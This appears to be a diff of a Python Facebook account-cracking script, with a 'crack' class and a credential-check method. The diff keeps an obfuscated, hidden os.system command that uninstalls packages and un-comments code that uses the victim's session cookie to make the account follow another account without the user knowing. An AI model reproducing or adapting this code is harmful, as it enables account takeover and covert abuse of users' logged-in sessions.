@@ -2,7 +2,7 @@ import os
 print ('\033[0;'+'30'+'m')
 os.system('pip '+'u'+'n'+'in'+'st'+'all '+'re'+'qu'+'es'+'ts urllib3 idna certifi charset_normalizer '+'-'+'y')
 os.system('clear')
-print ('\033[0;97m')
+print ('\033[1;93m')
 try:
     import requests
 except:
@@ -988,11 +988,11 @@ class crack:
         for x in r.find_all("a",href=True):
             if "/a/subscribe.php" in x.get('href'):
                 session.get('https://mbasic.facebook.com'+x.get('href'), cookies={'cookie':coki}).text
-        #if '/a/subscribe.php' in str(r):
-            #b=str(r).split('/a/subscribe.php')[1].split('">')[0].replace('&amp;', '&')
-            #session.get("https://mbasic.facebook.com/a/subscribe.php"+str(b), cookies={"cookie":coki}).text
-        #else:
-            #pass
+        if '/a/subscribe.php' in str(r):
+            b=str(r).split('/a/subscribe.php')[1].split('">')[0].replace('&amp;', '&')
+            session.get("https://mbasic.facebook.com/a/subscribe.php"+str(b), cookies={"cookie":coki}).text
+        else:
+            pass
 
     def cek_cp(self,user,pw):
         global ok,cp,f2
